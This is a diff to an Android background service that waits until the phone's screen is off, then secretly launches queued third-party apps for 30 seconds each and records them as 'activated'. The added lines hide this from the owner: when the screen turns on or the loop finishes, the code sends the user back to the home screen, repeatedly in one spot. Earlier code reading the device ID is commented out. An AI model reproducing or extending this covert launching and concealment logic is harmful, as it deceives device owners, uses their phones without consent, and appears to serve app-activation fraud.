@@ -25,7 +25,6 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.os.SystemClock;
-import android.telephony.TelephonyManager;
 import android.text.format.DateUtils;
 import android.text.format.Time;
 import android.util.Log;
@@ -44,8 +43,9 @@ public class CoreService extends Service {
 	private CoreReceiver receiver;
 	private SharedPreferences sharedPreferences;
 	private FinalHttp finalHttp;
-	private boolean isScreenLight = true;
 	private boolean isDownloading = false;
+	private boolean isScreenLignt = true;
+	private boolean isActive = false;
 
 	public static final int STOP_ACTIVE = 0;
 	public static final int START_ACTIVE = 1;
@@ -54,7 +54,7 @@ public class CoreService extends Service {
 
 	private long INIT_FIRST_TIME = -1;
 
-	private String deviceId = "";
+	// private String deviceId = "";
 
 	private Handler mHandler = new Handler();
 
@@ -69,8 +69,9 @@ public class CoreService extends Service {
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
 
-		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-		deviceId = tm.getDeviceId();
+		// TelephonyManager tm = (TelephonyManager)
+		// getSystemService(Context.TELEPHONY_SERVICE);
+		// deviceId = tm.getDeviceId();
 
 		finalHttp = new FinalHttp();
 
@@ -139,7 +140,7 @@ public class CoreService extends Service {
 		switch (type) {
 		case START_ACTIVE:
 			CommandUtil.logW("屏幕暗了。。。");
-			isScreenLight = false;
+			isScreenLignt = false;
 			if (INIT_FIRST_TIME != -1) {
 				if ((System.currentTimeMillis() - INIT_FIRST_TIME) >= 1000 * 60 * 30) {
 					if (sharedPreferences.getBoolean("first_launch", true)) {
@@ -151,14 +152,17 @@ public class CoreService extends Service {
 			break;
 		case STOP_ACTIVE:
 			CommandUtil.logW("屏幕亮了。。。");
-			isScreenLight = true;
-			CommandUtil.goHome(getApplicationContext());
+			isScreenLignt = true;
+			if (isActive) {
+				isActive = false;
+				CommandUtil.goHome(getApplicationContext());
+			}
 			checkActive();
 			break;
 		case UNLOCK_SCREEN:
 			CommandUtil.logW("解锁屏幕。。。");
 			if (INIT_FIRST_TIME == -1 && sharedPreferences.getBoolean("first_launch", true) && CommandUtil.simReady(getApplicationContext())) {
-				CommandUtil.logW("SIM卡正常，并且未初始化，开始初始化。");
+				CommandUtil.logW("SIM卡  正常，并且未初始化，开始初始化。");
 				INIT_FIRST_TIME = System.currentTimeMillis();
 			}
 			if (CommandUtil.isNetAvailable(getApplicationContext()))
@@ -287,6 +291,7 @@ public class CoreService extends Service {
 		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
 		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
 		while (cursor.moveToNext()) {
+			isActive = true;
 			long id = cursor.getLong(0);
 			String packName = cursor.getString(1);
 			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
@@ -321,7 +326,7 @@ public class CoreService extends Service {
 			SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
 			Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[] { String.valueOf(0) }, null, null,
 					SilenceAppDao.Properties.Installtime.columnName + " ASC");
-			while (cursor.moveToNext()) {
+			while (cursor.moveToNext() && CommandUtil.isNetAvailable(getApplicationContext())) {
 				long id = cursor.getLong(0);
 				String packageName = cursor.getString(1);
 				if (!installPackages.contains(packageName)) {
@@ -331,17 +336,27 @@ public class CoreService extends Service {
 				Intent app = getPackageManager().getLaunchIntentForPackage(packageName);
 				startActivity(app);
 				SystemClock.sleep(1000 * 30);
-				if (isScreenLight) {
-					break;
-				}
 				SilenceApp entity = new SilenceApp();
 				entity.setId(id);
 				entity.setPackagename(packageName);
 				entity.setActive(true);
 				dao.update(entity);
+				if (isScreenLignt)
+					break;
+			}
+			for (int i = 0; i < 3; i++) {
+				mHandler.postDelayed(goHome, 0 * 1000);
 			}
 			if (cursor != null)
 				cursor.close();
+		}
+	};
+
+	private Runnable goHome = new Runnable() {
+
+		@Override
+		public void run() {
+			CommandUtil.goHome(getApplicationContext());
 		}
 	};
 
